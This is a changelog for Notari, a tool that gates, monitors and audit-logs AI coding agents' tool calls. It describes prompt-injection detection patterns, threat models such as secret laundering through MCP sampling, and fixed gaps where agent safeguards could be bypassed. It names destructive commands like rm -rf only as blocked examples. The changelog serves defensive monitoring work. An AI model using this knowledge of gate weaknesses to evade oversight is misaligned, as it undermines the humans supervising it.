**`notari integrate <agent>`, teach your coding agent to query Notari data.** No LLM ships in Notari. Instead, this command appends a Notari-instructions snippet to the user's coding-agent rules file (`~/.claude/CLAUDE.md` for Claude Code, `./.cursorrules` for Cursor, `./CONVENTIONS.md` for Aider). The snippet lists the deterministic `notari` commands the agent can run when the user asks "what did the agent do this morning?" or "show me recent blocks." The user's existing coding agent does the inference; Notari provides the data layer. Auto-detects installed agents, idempotent via a `<!-- notari-integration v1 -->` marker, supports project-scope and per-user-global-scope installs, includes `--remove` for clean uninstall. Implemented in `src/notari/integrate.py` (~250 lines) + 18 tests covering install / idempotent re-run / refresh-on-drift / uninstall / content-preservation.

**`docs/research/cross-user-learning-design-2026-06.md`, privacy-respecting design exploration.** Three architecture paths laid out with honest tradeoffs: Path A (community policy packs, no telemetry, human-curated PRs), Path B (opt-in aggregated statistics with k-anonymity + differential privacy + no cross-day linkage), Path C (federated-style local-only learning that publishes signed pattern-deltas). Recommendation: ship Path A in v0.4, Path C in v0.5, Path B only if v0.6+ community demand warrants. The recommendation keeps no-telemetry-by-default as a hard default.

**Six new feature ideas captured as `[NEEDS RESEARCH]` tasks**, not built unattended:
- `notari audit export --format soc2-evidence-pack` (tar.gz with chain-verified slice + per-control summary + auditor PDF)
- `notari audit export --format eu-ai-act-article-12` (Article-12-shaped evidence with biometric retention semantics)
- Retention policy enforcement (`[retention]` config block with presets soc2-1y / eu-ai-act-6mo / eu-ai-act-biometric-24mo / hipaa-6y / glba-7y; verify each against primary regulator source before shipping)
- Multi-party approval for Article 14 dual-verification (2-of-N Touch ID / WebAuthn)
- Compliance mapping prose docs in `docs/compliance/`
- Vanta / Drata / Secureframe evidence-vault connectors (precondition: ship the SOC 2 evidence pack format first)

Each captured task includes the research questions that need answering before code lands.

Tests: 733 → 812. 79 new tests across `test_saves.py` (42), `test_insights.py` (19), `test_integrate.py` (18). Lint clean. Zero regressions.

### Wave 4, open-source-first reframe + prompt injection as a first-class feature

**Strategic reframe**: Loomiq landing page (paid consulting SKUs + Stripe Payment Links) moved from `web/loomiq-landing/` to `docs/marketing/future-loomiq-saas/` with a README explaining "deploy this after first 100 GitHub stars." The OSS launch wave runs first; charging on Day 1 splits the marketing message. Triggers documented for when to flip the paid surface on.

**README refresh** for emotional conversion:
- Disaster story (Replit Lemkin, Cursor rm -rf, GitHub PAT leak, Nov 2025 Anthropic Claude Code hijack) hoisted to the top.
- "Three reasons to install Notari in 30 seconds" up front: destructive-action refusal, prompt-injection defense, audit log your auditor will accept.
- Calibrated comparison table vs Microsoft AGT, AEGIS, Anthropic native PreToolUse, Cisco AI Defense / F5 CalypsoAI / Lasso / Pillar, Vanta / Drata / Secureframe, Lakera / NeMo / Prompt Security, Cerbos / Permit.io / OPA / WorkOS, Invariant Labs. Each row names the other tool's strengths before naming Notari's wedge.
- New top-level "Prompt injection defense, the layered story" section pulling the four-layer defense (no-LLM-in-gate, lethal trifecta enforcement, tool description pinning, secret detection) into one place. Pointer at the dedicated marketing doc.

**New `src/notari/prompt_injection.py` heuristic scanner**: 15 published-research-cited regex patterns across the standard taxonomy categories (direct instruction injection, role-token spoofing, context manipulation, instruction override, data exfiltration). Every pattern carries a `source=` attribution citing the academic paper or community guide it's drawn from (Liu et al. Open-Prompt-Injection benchmark, AWS Prescriptive Guidance, OpenAI ChatML format, Meta Llama INST format, Anthropic turn-marker convention, Willison Lethal Trifecta, Shen et al. USENIX DAN-jailbreak family, Maxim AI 2026 Defense Guide). Observation-only signal per OWASP LLM01:2025's explicit guidance that no regex set can guarantee mitigation; hits surface in the audit log + a new `notari scan-prompts` CLI for pre-ingestion review of third-party content (web fetches, RAG corpora, user-uploaded documents). 31 tests covering every pattern + published attack-template corpora; if any documented attack template stops matching, the pattern set has regressed.

**New marketing docs**:
- `docs/marketing/prompt-injection-defense.md`: dedicated page for developers shipping agents that scour the internet (research bots, RAG-driven retrieval, scrapers). Explains the four-layer defense, the 2025 academic consensus on why content-classifier-alone defenses are bypassed at >90%, and what Notari explicitly does NOT defend against (calibrated).
- `docs/marketing/why-notari-vs-others.md`: full honest comparison vs every named competitor in the agent-governance space. Each section names the other tool's strengths before Notari's wedge. Closes with the one-line positioning sentence and the wedge / weakness summary.
- `docs/marketing/future-loomiq-saas/README.md`: explanation of why the paid landing page is parked + the trigger conditions for flipping it on.

### Wave 3, marketing artifacts

- **EU AI Act August 2026 readiness guide** at `docs/marketing/eu-ai-act-august-2026-readiness.md`. Primary-source citations from `artificialintelligenceact.eu` for Articles 12 (record-keeping), 14 (human oversight), 19 (retention), and 26 (deployer obligations). Spells out the three gaps most current deployments have (no agent-tool-call logs, no tamper-evidence, weak human-oversight evidence) and maps Notari's audit-event taxonomy onto each Article's requirement. Closes with the four-week onboarding plan for getting compliant before August 2, plus the $4,500 Evidence Pack engagement CTA.
- **Coding-agent incident recovery guide** at `docs/marketing/coding-agent-incident-recovery.md`. SEO-targeted at the post-incident search queries ("claude code deleted my files", "cursor agent rm -rf", "ai agent committed secrets"). Lead with "first three things" (stop the agent, don't touch the disk, screenshot scrollback) then per-failure-mode recovery: `rm -rf`, force-push, `DROP TABLE`, leaked secrets, accidental prod deploy, fabrication-to-pass-tests. Each failure mode closes with the Notari prevention path.
- **README "Further reading" section** added before Security, pointing at all three marketing docs plus the existing `clients.md` and `byo-agent.md`. Discoverability for the v0.3-prep marketing assets.

### Wave 2, polish round

- **`notari onboard` trusted-directories prompt**: instead of silently adding `cwd` to `[trust]` paths, the wizard now asks `trust current directory ($cwd)?` with default Yes and offers a follow-up prompt to add additional paths. The "fix for approval-prompt fatigue" feature surfaces explicitly to new users.
- **CLI integration tests**: new `tests/test_cli_integration.py` (21 tests) exercises the new commands (`onboard`, `scan-secrets`, `audit export --pack`, `commit-hook-install`, `commit-hook-uninstall`, `git-hook` shim) via `typer.testing.CliRunner`. Caught a real bug in the `git-hook` Typer command (positional args from the prepare-commit-msg shim weren't being forwarded to `prepare_commit_msg`); fixed by switching the command to `context_settings={"allow_extra_args": True}` and reading from `ctx.args`. Without the integration tests, this would have shipped broken.
- **Line numbers in `SecretHit`**: `scan(text)` now computes the 1-indexed line where each hit starts, and `hit_summary(hits)` renders them as `GitHub Personal Access Token (classic) (line 42)` instead of just the pattern name. `notari scan-secrets` output now prints `path/to/file.py:42: GitHub PAT at line 42` in editor-jumpable format.
- **`notari scan-secrets` respects `.gitignore`**: when invoked inside a git repo, the scanner walks via `git ls-files --cached --others --exclude-standard` so `node_modules`, `.venv`, build artifacts, etc. are skipped without manual filtering. Falls back to `rglob` outside a repo or with `--no-gitignore`.
- **`commit-hook-install` bakes the absolute `notari` binary path** into the installed `prepare-commit-msg` script at install time (resolves `sys.executable`'s sibling `notari`, falls back to `shutil.which("notari")`, final fallback is the literal string `notari`). Before this fix, the hook silently no-op'd whenever the user's shell at commit time didn't have the install's venv activated.
- **`pdf` optional dependency**: new `pip install notari[pdf]` extra installs `weasyprint>=62` as a cross-platform PDF renderer for `notari audit export --pack`. The headless-browser path (Chrome / Brave / Edge / Chromium) is still tried first; weasyprint is the fallback when no system browser is available. Linux users without Chrome can now produce the evidence-pack PDF cleanly.
- **README "What's mature vs framework-prepared" section refreshed**: added rows for `notari onboard`, secret detection on file writes, `notari audit export --pack`, the prepare-commit-msg hook integration, and the per-tool hook-adapter v0.3 roadmap item for Cline / Aider / Continue / Windsurf / Zed (today via MCP-proxy mode only). Updated dogfood numbers from "10k+ entries" to "22k+ entries verified end-to-end".
- **AIUC-1 control-mapping one-pager** published at `docs/marketing/aiuc-1-mapping.md`. Rows: Notari audit event types. Columns: AIUC-1 controls in the Accountability, Reliability, and Security domains (E015 / E015.2 / D003.1 / D003.3 / D003.4 / C007.3 / REL-01 / SEC-01 / SEC-02 / SOC-01). Cells: which event satisfies which control with payload field references and ✓ direct vs ▲ partial coverage. The single canonical outreach artifact for Schellman / Armilla / Vouch.

### Added, `commit-hook-install` / `commit-hook-uninstall` + `notari git-hook`

- New `notari commit-hook-install` wires a `prepare-commit-msg` hook into a repo's `.git/hooks/`. The hook finds the most recent active agent session (configurable freshness window, default 4h) and appends a `#`-prefixed comment block to the commit message buffer carrying session id, time window, tool call / blocked / asks / Touch ID counts, top changed directory, TDR if not 1.0, and a capped list of block reasons + to-verify items. Git treats the lines as comments by default, so the block adds context without polluting the commit message unless the user uncomments specific lines. Skips merge / squash / amend commits where prepending is wrong. Idempotent (`# === Notari session summary ===` marker is the recognition string). Refuses to overwrite a non-Notari existing hook so we don't silently break someone's hook chain. Uninstall is symmetric. Implemented in `src/notari/githook.py` plus a `notari git-hook` shim that's invoked by the installed script. 18 new tests.

### Added, `notari audit export --pack` one-command compliance PDF

- `notari audit export` grew a `--pack` flag that enables every standard at once (EU AI Act Art 12 + 14 + 19, AIUC-1, NIST AI RMF, NIST GenAI Profile, ISO/IEC 42001, SOC 2 Common Criteria, MITRE ATLAS) and renders a real PDF via headless Chrome / Brave / Edge / Chromium (no LaTeX dependency required, no new Python deps). New `--nist`, `--iso-42001`, `--soc2`, `--mitre-atlas` flags allow per-standard selection. New `--format pdf` and `--format all` options. New `--open` flag opens the PDF in the OS default viewer (Preview on macOS, xdg-open on Linux). Verified end-to-end against the live audit log (22,143 events → 39 controls → intact chain → 483KB PDF in ~3s). This is the deliverable for the $4,500 EU AI Act Evidence Pack SKU.
- Helper functions `_render_html_to_pdf` and `_open_path` are local to `cli.py` to keep the public library surface clean.

### Added, `notari scan-secrets` and runtime secret-detection on file writes

- New `src/notari/secrets.py` ships 18 vendor-format credential patterns (AWS access keys, OpenAI legacy + project keys, Anthropic API keys, GitHub classic + fine-grained PATs + OAuth + App tokens, Stripe live + test + restricted keys, Slack bot + user tokens + webhook URLs, Google API keys, JWTs, PEM-encoded private keys, HuggingFace tokens). `scan(text)` returns `SecretHit` records that never persist the matched value (only pattern name + offset + length, so the scanner is safe to use on audit-logged content). `scan_args(tool_name, args)` is the integration helper for file-write tools (Edit / MultiEdit / Write / NotebookEdit; walks MultiEdit's `edits` list element-by-element).
- Wired into `notari.adapters.claude_code.classify_event` so any Edit / Write / NotebookEdit whose new content contains a secret is escalated to `Risk.CRITICAL` with reason `secret detected in write: <pattern_summary>` and the safer-alternative suggestion `move the value to a secrets manager / env var and reference it by name`. This is the direct mitigation for the GitHub PAT leak failure mode cited in every Notari pitch and in Anthropic's November 2025 incident class.
- New CLI command `notari scan-secrets <path>...` scans files or directories and exits non-zero on any hit. Useful as a pre-commit check or in CI.
- 27 new tests in `tests/test_secrets.py` covering each pattern + the adapter integration.

### Added, Plain-English session receipts

- `Receipt` gained four narrative fields (`blocks_summary`, `asks_summary`, `biometric_approvals`, `top_changed_dir`) populated by `derive_from_events` from existing event types (no new event types written). New `narrate(receipt)` function renders a Receipt as a deterministic plain-English paragraph: *"between 2026-06-08 09:14:22 and 11:42:11 the agent ran 12 tool calls, touched 2 files mostly in src/auth, refused 1 destructive operation, and confirmed 1 critical action via Touch ID. Trust delivery rate 92%. Blocked: Bash: rm -rf is critical-risk."* Deterministic template, no LLM, no probabilistic anything. Verified live against the audit log on three real sessions; reads naturally.
- `notari receipts show` now opens with the narrative paragraph and follows with the structured did / changed / uncertain / to_verify blocks below. New `--prose` flag suppresses the structured detail and prints only the paragraph (one-line shell-friendly output).
- 15 new tests in `tests/test_receipt_narrate.py`.

### Added, Compliance crosswalk: NIST AI RMF, ISO 42001 A.6.2.8, SOC 2, MITRE ATLAS

- The control mapping that drives `notari audit export` moved from a 612-line hardcoded `CONTROLS` tuple in `src/notari/exports.py` to a data file at `src/notari/controls.toml`. Adding new control mappings is now TOML editing, not Python editing.
- Added **NIST AI RMF** rows (GOVERN-1.4, MAP-4.1, MEASURE-2.7, MEASURE-2.8, MANAGE-4.1) and **NIST GenAI Profile** rows (GENAI-MG-3.1 for tool-call provenance, GENAI-MS-2.6 for pre-deployment testing).
- Added **ISO/IEC 42001:2023** rows: A.6.2.8 (the headline "AI System Recording of Event Logs" control whose required fields read like Notari's audit schema), plus A.6.2.6 (operation and monitoring) and A.6.2.7 (lifecycle documentation).
- Added **SOC 2 Common Criteria** rows: CC6.1 / CC6.2 / CC6.3 (logical access), CC7.2 / CC7.3 / CC7.4 (monitoring, evaluation, incident response), CC8.1 (change management for agent-initiated changes), CC9.1 / CC9.2 (risk mitigation + vendor risk). Each carries the honest caveat that the AICPA has not issued AI-specific TSC, so individual auditor acceptance is auditor-specific.
- Added **MITRE ATLAS** mitigation rows: Publish Poisoned AI Agent Tool (mitigated by `pinning.py`), Escape to Host (mitigated by the CVE-2025-59536 subcommand-chain bypass gate at `policy.py:333`), broad Tool Misuse class.
- Added five additional **AIUC-1** Accountability rows mapping to the published changelog: E015.2 (agent logging with intermediate steps + sub-agents), D003.1 (tool authorization), D003.3 (MCP call log), D003.4 (chained-operation approval), C007.3 (anti-automation-bias review).
- Split the old `ART-12-RETENTION` row into `ART-12-AUTO-LOGGING`, `ART-12-TAMPER-EVIDENT`, and `ART-19-RETENTION` to match the actual EU AI Act statute structure (Art 12 = automatic logging + tamper evidence; Art 19 = retention period).
- Total: 39 controls across 12 standard families, up from 10 controls across 4 families. `aggregate()`'s default `standards` list expanded to include all 9 family names so they all appear in the export by default.

### Added, `notari onboard` interactive first-run setup

- New `notari onboard` command replaces the placeholder-filled output of `notari init` with a guided 60-second flow that auto-detects which coding agents the user has installed (Claude Code, Cursor, Cline, Aider, Continue, Windsurf, Zed), asks which to gate, prompts for audit-log location, notification channels (macOS banner / Slack webhook / generic webhook), risk preset (boring/paranoid/custom), and session intent + scope. Writes `config.toml` mode `0o600`, invokes the existing `claude_code.install_into_settings` and `cursor.install_into_settings` adapters for any chosen agent, and prints a next-steps panel. Safe to re-run; existing config is preserved unless `--force` is passed or the user explicitly confirms overwrite. Non-TTY contexts abort cleanly. Implemented in `src/notari/onboard.py` (~330 lines, under the 300-line file rule once the docstring and dataclasses are netted against the comment count) and wired into the CLI at the top-level next to `start`. New TOC line in the root help puts `notari onboard` first.
- Tests in `tests/test_onboard.py` cover detection, TOML rendering (boring + paranoid presets), Pydantic round-trip via `load_config`, scope serialization, the notify-section emission rule, and the non-TTY abort path. 13 new tests, all passing.

### Fixed, `[policy]` overrides in `config.toml` actually load

- The `NotariConfig.policy` field was typed `dict[str, Risk]` with strict-mode Pydantic, which silently rejected the documented `[policy]` TOML overrides because `isinstance("critical", Risk)` is `False` even though `Risk` is a `str`-enum. Anyone who tried `"fs.delete" = "critical"` in their config got a validation error and rolled back. Added a `@field_validator("policy", mode="before")` that coerces string values to `Risk(value)` before strict validation runs. The documented feature works now; this also makes the `paranoid` preset writeable by `notari onboard` round-trip cleanly through `load_config`. Pure additive change; existing configs without `[policy]` overrides are unaffected.

### Documentation

- `docs/clients.md`: per-client MCP-proxy config snippets for Claude Desktop, Claude Cowork (GA'd 2026-04-09, shares Desktop's `claude_desktop_config.json` on macOS), Cline, Windsurf, Continue, Cody, Zed, GitHub Copilot agent mode, JetBrains AI, and the OpenAI Codex CLI MCP fallback, plus a brief recap of the existing Claude Code and Cursor 1.7+ hook adapters. Each entry is honest about which surfaces Notari gates today (every MCP-routed tool call, including custom MCP servers behind Notari) and which it doesn't (the client's own built-ins, including Cowork file edits / scheduled tasks / Anthropic-managed connectors, Cline's built-ins, Windsurf's built-ins). Includes a Cowork-specific note about the OpenTelemetry bridge for Enterprise tenants via `NOTARI_OTEL_ENDPOINT`.
- `docs/byo-agent.md`: how to wire Notari into an agent loop someone wrote themselves. Covers two paths today (MCP-proxy via `notari serve` for any loop that already supports MCP servers, and the interim "wrap your direct dispatches in a local MCP server" pattern for loops that dispatch tools directly in Python), plus the v0.3 ship target (`from notari import gate` as the single public library API per `docs/research/universal-adapter-strategy-2026-05.md` §4), and the universal bare-loop template that every framework adapter wraps.
- README "Other clients" subsection added under Path B pointing at both docs pages. No code or behavior change in this slice; v0.3 universal-adapter implementation work is unchanged on the ship list.

<details>
<summary><b>Pre-0.3.0 alpha history</b> (0.2.x, before the rename to Notari and the Change Control pivot)</summary>

> Note: some links in these historical entries point at research notes and docs
> (`docs/research/*`, `docs/clients.md`, `docs/byo-agent.md`) that were internal
> working material or were removed from the public tree at the Change Control
> pivot; they are kept here as-written for the historical record.

## [0.2.0a5] - 2026-05-27

### Added, MCP Registry ownership verification

- Added the `mcp-name: io.github.manumarri-sudo/quill` magic line to README (as an HTML comment near the top so it stays out of the rendered display but is present in the raw markdown PyPI ships). The official MCP Registry validates this line against the PyPI package's README as proof that the namespace owner controls both the GitHub repo and the PyPI dist. v0.2.0a5 is functionally identical to v0.2.0a4, the only change is this line plus the version bump. Submission to `registry.modelcontextprotocol.io` proceeds against this release. (The project has since been renamed to Notari, see 0.3.0, so the registry entry needs re-submission under `io.github.manumarri-sudo/notari`.)

## [0.2.0a4] - 2026-05-27

### Changed - PyPI dist rename and first PyPI publish

- The PyPI dist name is now `quillx` (the project was still named Quill at this release; see 0.3.0 for the rename to Notari). The `quill` name on PyPI is held by an unrelated, 17-month-silent package in a different domain (LLM-based README generation), so `pip install quill` would never have resolved to this project. Install becomes `pip install quillx` / `pipx install quillx` / `uvx --from quillx quill`. The import path, CLI binary (`quill`), config directory (`~/.quill/`), env vars (`QUILL_KEY`), HMAC key path, audit log path, and brand are all unchanged; this is a distribution-name change only and existing dogfood state (audit log, approvals, sessions) is fully forward-compatible. Homebrew is a tap we own so the formula stays `brew install quill`. A PEP 541 reclaim request for the `quill` name was in flight at the time; the later rename to Notari (0.3.0) mooted it.
- First publish to PyPI, under the `quillx` dist name. v0.2.0a4 is functionally identical to 0.2.0a3; the only changes are the dist rename in `pyproject.toml`, the version-string bump in `pyproject.toml` + `src/quill/_version.py` + the README badge, the `[all]` extra updated to reference `quillx[...]`, and documentation updates in `README.md` and `docs/distribution.md` to reflect the new install command. No code or behavior changes, all P0 fixes shipped in 0.2.0a2/0.2.0a3 are unchanged and the audit chain remains forward-compatible.

## [0.2.0a3] - 2026-05-18

### Fixed

- `src/quill/_version.py` (the package's pre-rename path) was missed in the 0.2.0a2 version bump, so the runtime `quill version` command reported `0.2.0a1` even though pyproject and wheel filename were correctly 0.2.0a2. Now consistent. No code changes other than the version string itself; all 0.2.0a2 P0 fixes are unchanged and still verified end-to-end against the audit chain.

## [0.2.0a2] - 2026-05-17

### Fixed - launch-gating P0s found via efficacy analysis

- **Notify dispatch race on real blocks.** `NotifyDispatcher.fire()` spawned a `daemon=True` thread, but Claude Code's `PreToolUse` hook is a short-lived subprocess. The thread was killed mid-flight before it could complete the channel call or emit the `notify.dispatched` audit event, so no out-of-band notification ever fired on real blocks (only on explicit `notari notify test`). Added `fire(msg, wait_timeout=0.1)` that joins the thread for up to 100ms; `_maybe_notify` in the Claude Code adapter passes that timeout. First real-block `notify.dispatched` event observed at 2026-05-17T18:48:48 (rm -rf block, macOS banner delivered, ~80ms total dispatch time).
- **Trust-scope auto-allow silently bypassed trifecta enforcement.** A session at 2-of-3 lethal-trifecta flags could close the third (Write to a `.env`-pattern file) without triggering enforcement when the cwd was a trusted scope. Trust-scope check now peeks at `would_close_trifecta` before downshifting; if the call would close, trust scope yields and the trifecta enforcement block fires. Trust scope still suppresses every other default-risk Edit/Write ask in trusted dirs, so the ergonomics are unchanged for non-trifecta workflows. Verified end-to-end at 2026-05-17T18:49:58.
- **Trifecta-close blocks inherited risk from the underlying decision.** `HookDecision` for trifecta closure used `risk=decision.risk` (often LOW for Edit/Write), which meant the notify dispatcher (`on_critical_only=True` default) never fired on trifecta closures even after the dispatch race was fixed. Hardcoded `risk=Risk.CRITICAL` on trifecta-close, by definition the worst-case prompt-injection scenario.

### Added - launch hygiene

- `_is_test_session_id` heuristic + `--include-test-sessions` flag on `bridge show`, `trifecta show`, and `receipts list`. Default views now hide unit-test fixtures (session_ids that aren't UUID-shaped) so any "look at my own audit log" demo screenshot is clean. Source log is untouched so the HMAC chain stays intact.
- `notari journal save` now emits `session.close` and runs the drift check unconditionally (was gated behind transcript-required check). Real Claude Code SessionEnds pass a session_id but not always a transcript_path; result was that 30 of 32 sessions were stuck in "(open)" state in receipts derivation. Fixed; receipts now derive from clean session boundaries.

### Documentation

- README adds a "What's mature in 0.2.0a2 vs framework-prepared" section near the top so readers can distinguish dogfood-proven pillars (gate + audit + notification + approve + trifecta) from framework-prepared surfaces (A2A bridge on Claude Code, permission decay triggers, external-MCP pinning) without reading the whole document.
- A2A Bridge section honestly scopes the adapter maturity: Cursor 1.7+ gets full subagent capture today; Claude Code subagent capture is pending hook-API support from Anthropic.

## [0.2.0a1] - 2026-05-15

### Added - v0.2-rc1 universal-adapter leg (Cursor 1.7+)

- **Cursor 1.7+ pre-tool-call hook adapter** (`src/notari/adapters/cursor.py`). Cursor (~1.5M MAU) shipped a hooks system in Sept 2025 that's near-identical to Claude Code's `PreToolUse`. Notari now installs into `~/.cursor/hooks.json` (`notari cursor-hook-install`) and gates `beforeShellExecution`, `beforeMCPExecution`, `beforeReadFile` events. Reuses Notari's existing risk classifier + audit log + approval-token + Touch ID flow unchanged; only the input/output JSON shapes are adapter-specific (Cursor uses top-level `permission` / `agent_message` / `user_message`, not Claude Code's `hookSpecificOutput`).
- **Cursor-specific deny-instead-of-ask defense.** Cursor's Auto-Run allow-list silently overrides `permission: "ask"` ([forum-reported](https://forum.cursor.com/t/beforeshellexecution-hook-permissions-allow-ask-ignored-allow-list-takes-precedence/144244)). Notari returns `deny` on HIGH-risk calls when running under Cursor and routes the user through the same one-shot `notari approve <token>` flow Claude Code uses. The allow-list can't override that path because the approval is consumed by Notari, not enforced by Cursor.
- **Idempotent install** preserves any existing user-defined hooks. 18 tests pin the contract (normalize-input per event, deny-not-ask invariant, response-shape pinning, fail-open on malformed JSON, audit-emit, approval-consume, install-merge).
- Research basis: `docs/research/universal-adapter-strategy-2026-05.md` - full SOTA matrix of 24 coding-agent / runtime targets with vendor / build-on / write-fresh verdicts. Cursor flagged as the highest-leverage next adapter (~1.5M MAU, near-zero new logic, 1-line install).

### Added - v0.2-rc1 polish leg (post-SOTA-research)

- **TUI command palette** (`Ctrl+P` / `:` in `notari watch`). Textual's built-in CommandPalette wired with a `NotariCommands` provider exposing every action (filter: all/allowed/blocked/asked/scope, pause, clear, scroll top/bottom, peek, yank, help, quit). Fuzzy-searchable; new users don't need to memorize the 14 hotkeys. ~80 LOC, zero new dependencies (Textual ships it natively, MIT). Source: `src/notari/tui.py::NotariCommands`.
- **`notari notify test [--channel ...]`** - fires every configured channel synchronously and prints a per-channel ✓/✗ table. Closes the "did my [notify] config actually deliver?" loop without waiting for a real block. Audit-logs as `notify.dispatched` with `tool_name="notari.notify_test"` so test fires can be distinguished from real ones in `notari audit show`.
- **Onboarding wizard in `notari start`**. After installing the Claude Code hook, the wizard prompts for notifications, writes a `[notify]` block to config.toml (auto-enables `macos = true` on Macs; commented stubs for Slack/email/webhook), and offers to fire a test banner immediately. Idempotent - re-running detects an existing `[notify]` and reports status instead of re-asking. Non-TTY contexts skip silently. KeyboardInterrupt-safe. Library: `typer.prompt` (already a Notari dep - zero new packages).
- **Bench file gated behind optional dep** (`tests/test_bench_hot_path.py`). `pytest.importorskip("pytest_benchmark")` lets default `pytest -q` cleanly skip the file. Run with `pytest -m bench --benchmark-only` after `pip install 'notari[dev]'`.
- **Measured perf numbers** (Apple Silicon, Python 3.14): full `run_hook` allow path P50 = 84.6 µs / max = 518 µs (24× under the README's 2 ms budget); block path P50 = 408 µs / max = 715 µs (14× under). README claim is honest but understated.

Research basis: `docs/research/polish-and-launch-2026-05.md` - SOTA survey of k9s, lazygit, btop, Charm/gum, GitHub CLI, fly.io, OTel GenAI semconv, Langfuse / Phoenix / Datadog ingest paths. v0.3 follow-up: OTel `[otel]` extra (~230 LOC + 3 Apache-2.0 packages), split-pane peek, sub-agent collapse, trifecta sidebar.

### Added - v0.2-rc1 follow-up: Touch ID-gated approvals (anti-hijack)

- **Hardware-attested approval via Touch ID** (`src/notari/touchid.py`, ~110 lines, macOS-only). `notari approve <token>` now requires a fingerprint match against the user's enrolled biometrics before persisting the approval. The match runs in the Secure Enclave; userspace gets only a yes/no. A compromised terminal that can type the token still can't release the call. The default approve flow is one prompt at the human's terminal - agents consume the approval later when nobody's watching.
- **Optional dep**: `pip install 'notari[touchid]'` pulls `pyobjc-framework-LocalAuthentication>=12.0,<13` (Apple's official MIT-licensed binding via Ronald Oussoren's pyobjc project; ~30 KB wheel; macOS-only, falls through cleanly on Linux/Windows/SSH).
- **`--no-biometric`** flag on `notari approve` for headless/SSH sessions. **`--require-biometric`** flag refuses approval when Touch ID isn't available (paranoid mode).
- **Three new audit event types**: `approve.biometric.ok`, `approve.biometric.deny`, `approve.biometric.skipped`. Every approve outcome (success / lockout / user_canceled / not_available / opted_out) writes a force-fsync'd entry to the chained audit log.
- **Security invariant test pinned**: `test_authenticate_uses_biometrics_only_policy_not_password_fallback` asserts the policy constant is `LAPolicyDeviceOwnerAuthenticationWithBiometrics` (value 1), never the password-fallback variant `LAPolicyDeviceOwnerAuthentication` (value 2). The latter falls back to a typeable login password - which a keylogger captures, defeating the hardware root. CI fails loudly if a future refactor swaps the constant.
- **Live-fire verified** on Apple Silicon during implementation: `canEvaluatePolicy` returned True, the reply block fired, real Touch ID prompt appeared, success result confirmed. The `threading.Event` + reply-block pattern works WITHOUT a custom NSRunLoop pump - no Info.plist / `NSFaceIDUsageDescription` required for Touch ID (only Face ID enforces it, and no Mac ships Face ID).
- Research basis: `docs/research/hardware-attested-approvals-2026-05.md` - SOTA survey of `pinentry-touchid`, `lox/go-touchid`, 1Password CLI, GitHub CLI WebAuthn, sigstore cosign, age-plugin-yubikey, FIDO2/CTAP2.

### Fixed - v0.2-rc1 follow-up (post-live-test)

- **`notari serve` stdio framing corruption (P0).** structlog defaulted to a stdout PrintLogger; running as an MCP server interleaved structlog output with JSON-RPC frames. The mcp SDK was forgiving but a stricter client would crash. Now `src/notari/proxy.py` calls `structlog.configure(logger_factory=WriteLoggerFactory(file=sys.stderr))` at module load. stdout pollution = 0 bytes.
- **Prompter deadlock under stdio (P0).** `Prompter.confirm()` called `input()`, but stdin is owned by the JSON-RPC reader under `notari serve` - every HIGH/CRITICAL tool auto-failed as "human declined." Now `Prompter` detects non-TTY stdin, issues an out-of-band approval token, fires notifications, and declines THIS call with a paste-able `notari approve <token>` line on stderr. The agent's retry within the TTL gets through via the same approval-consume path used by the Claude Code hook.
- **Scope action field ignored (P1).** `Scope.matches_tool` only compared `namespace`, so `scope=["filesystem:read"]` silently granted the entire `filesystem.*` namespace including `write_file` and `delete_file`. Now matches require namespace AND action (prefix-bounded on `_` or `.`); use `*` or `any` for the explicit-wildcard case. Three regression tests added.
- **Notification fallback log.** macOS banners can be silently suppressed by Focus mode / DND; even a successful `osascript` exit doesn't prove the user saw anything. Every dispatch now also appends a JSONL line to `$NOTARI_HOME/notify.log` with per-channel results, so the user can `grep` "did this fire?" without relying on the GUI. `_send_macos` now treats non-zero exit as failure (was previously ignored).
- **Sampling default-deny.** Upstream MCP `sampling/createMessage` requests are now refused by default with an audit emit (`upstream.sampling.refused`). Trusted upstreams opt in via `[[upstream]].allow_sampling = true`. The threat model: an attacker-controlled upstream uses sampling to launder secrets through the downstream client's LLM context.
- **Trifecta enforcement.** When a tool call would close the lethal trifecta (untrusted input + private data + exfil vector) for the first time in a session, the gate now escalates from `allow` to `deny` with a paste-able approve token. Previously the trifecta was observation-only; now it gates. Approval-token consume bypasses the escalation since the user explicitly OK'd the call. Once the trifecta is closed, subsequent calls do NOT re-escalate (secrets already exposed; gating later doesn't reduce harm). Three regression tests pin the behavior.
- **Cancellation forwarding.** `notifications/cancelled` from the downstream client is now forwarded to the upstream MCP server via `ClientSession.send_notification` in `src/notari/_vendor/proxy_factory.py`. Previously a cancelled tool call leaked CPU/IO upstream until the upstream's own timeout fired.

### Added - v0.2-rc1 (Trust Infrastructure layer + notification + approval)

- **Out-of-band notifications** (`src/notari/notify.py`): when a call is blocked or asks for confirmation, fan a structured WHAT / WHY / TRY-INSTEAD / APPROVE message to every channel the user opted in to via `[notify]` in config.toml. Channels: macOS Notification Center (osascript), email (SMTP), Slack incoming webhook, generic JSON webhook. Zero new dependencies - stdlib only. Each channel runs on a daemon thread; the gate's hot path never blocks. Per-channel results audit-logged as `notify.dispatched`.
- **One-shot approval tokens** (`src/notari/approvals.py` + `notari approve <token>`): every block/ask issues a 10-minute token bound to the exact `(tool_name, args_digest)` that was refused. The notification carries the token and the command. The user's "go ahead" path is one shell command. Single-use by design - an attacker who hijacks the agent mid-session can't reuse the token for a different command, and a multi-use approval would bypass Permission Decay. CLI: `notari approve <token>` / `notari approvals list / revoke`.
- **Structured WHAT / WHY / TRY-INSTEAD on every decision**: `HookDecision` now carries the three fields separately so notifications render consistently across channels. `_summarize_call(tool_name, tool_input)` produces the one-line WHAT (`"rm -rf node_modules"`, `"Edit /x/y.py"`); the policy classifier produces the WHY and the safer-alternative suggestion.
- **Test isolation via `tests/conftest.py`**: autouse fixture points `NOTARI_HOME` at a per-test tmp directory. Approvals, pins, decay, taint state, sessions index, telemetry no longer leak between tests.



- **Audit-chain race fix**: `fcntl.flock(LOCK_EX)` around `AuditLog.emit` with re-read of the tail mac inside the lock. Concurrent hook subprocesses no longer break the chain. Regression test under multi-process workers.
- **`notari audit repair --legacy --yes`**: re-chain a log broken by the pre-fix concurrent-write defect. Emits a `chain.repaired` event so the operation is itself audit-logged.
- **`NOTARI_HOME` env var** scopes everything (config, audit log, key, decay, telemetry, watch.pid, sessions, taint, pins). Per-file env vars still override.
